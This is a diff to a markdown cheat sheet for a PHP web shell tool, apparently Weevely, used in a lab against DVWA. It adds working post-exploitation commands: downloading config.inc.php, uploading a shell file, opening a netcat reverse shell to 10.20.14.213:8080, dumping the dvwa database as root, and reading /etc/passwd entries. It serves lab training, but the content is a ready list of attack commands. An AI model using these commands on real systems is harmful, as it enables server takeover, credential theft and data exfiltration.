@@ -25,14 +25,21 @@
   - ```[function name]```
 - Download
   - ```file_download -vector [VECTOR] [FileName] -host [HOST] [location to store file]```
+  - ```file_download -vector file config.inc.php /root/config-downloaded.txt```
+  - different vector should be checked, until one of them works
 - Upload
   - ```file_upload -vector [VECTOR] [location on local machine] [location to store file]```
+  - ```file_upload /root/test.txt ./test-shell-uploaded.txt```
 - Reverse shell
   - ```backdoor_reversetcp -vector [VECTOR] [Your IP] [PORT]```
+  - ```backdoor_reversetcp -vector netcat 10.20.14.213 8080```
 - Access database
   - ```sql_console```
   - ```sql_dump -vector [VECTOR] -host [HOST] -lpath [location to store data] [DB Name] [username] [password]```
+  - ```sql_dump -vector mysqldump_sh -host localhost -lpath /root/dvwa-data.txt dvwa root```
 - Other functions
   - ```whoami``` 
-  - ``` shell_sh [command]```
+  - ```shell_sh [command]```
   - ```shell_sh -v [vector] [command]```
+  - ```system_info```
+  - ```audit_etcpasswd -vector posix_getpwuid```
